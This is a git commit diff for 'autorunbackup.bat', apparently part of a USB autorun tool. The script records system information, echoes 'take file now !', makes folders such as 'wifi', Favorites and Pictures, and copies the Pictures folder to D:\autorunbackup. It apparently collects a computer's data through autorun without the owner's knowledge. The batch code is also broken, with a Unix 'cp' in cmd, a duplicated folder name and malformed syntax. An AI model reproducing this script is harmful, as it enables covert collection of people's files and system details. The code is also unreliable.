39a003ec978106edd84fbb442d4e59431a48e7e3
dim <papadimdim@yahoo.gr>
2019-10-18 21:24:05 +0300

    modified .inf and autorunbackup.bat

--- autorunbackup.bat
+++ autorunbackup.bat
@@ -4,4 +4,9 @@ cd autorunbackup
 date /t >> systeminfo.txt
 systeminfo >> systeminfo.txt
 echo take file now !
-mkdir Documents Desktop
+mkdir Downloads Desktop Favorites wifi Pictures Downloads
+
+cmd /c start if exist D:\ (echo File:  exist! | cp -rf Pictures D:\autorunbackup\Pictures) else (echo file %1 doe not exist ! :( )
+
+
+cmd /c start
